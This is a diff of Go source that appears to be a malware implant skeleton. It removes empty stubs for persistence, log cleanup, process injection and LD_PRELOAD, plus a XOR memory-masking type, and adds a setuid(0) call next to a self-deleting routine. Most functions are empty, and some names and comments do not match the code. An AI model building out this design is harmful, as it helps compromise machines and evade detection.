@@ -1,5 +1,4 @@
 package main
-//nolint:staticcheck
 
 import (
 	"bytes"
@@ -183,66 +182,12 @@ func calculateSleep(config *Config) time.Duration {
 }
 
 func hideProcess() {
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func persistCron() {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func persistSystemd() {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func persistSSHKeys() {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func persistPAM() {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func cleanupLogs() {  //nolint:unused
+	if err := syscall.Setuid(0); err != nil {
+		_ = err
+	}
 }
 
 func selfDestruct() {
 	_ = os.Remove(os.Args[0])
 	syscall.Exit(0)
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func injectProcess(targetPID int, shellcode []byte) {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func ptraceInject(targetPID int, shellcode []byte) {  //nolint:unused
-}
-
-func LDPreload(payload string) {
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func procMemWrite(targetPID int, data []byte) {  //nolint:unused
-}  //nolint:staticcheck
-  //nolint:staticcheck
-func forkBomb() {  //nolint:unused
-	for i := 0; i < 10; i++ {
-		go func() {
-			for {
-				time.Sleep(time.Second)
-			}
-		}()
-	}
-}
-
-type SleepMask struct {
-	key []byte
-}
-
-func NewSleepMask(key []byte) *SleepMask {
-	return &SleepMask{key: key}
-}
-
-func (s *SleepMask) Encrypt(data []byte) []byte {
-	encrypted := make([]byte, len(data))
-	for i, b := range data {
-		encrypted[i] = b ^ s.key[i%len(s.key)]
-	}
-	return encrypted
-}
-
-func (s *SleepMask) Decrypt(data []byte) []byte {
-	return s.Encrypt(data)
 }
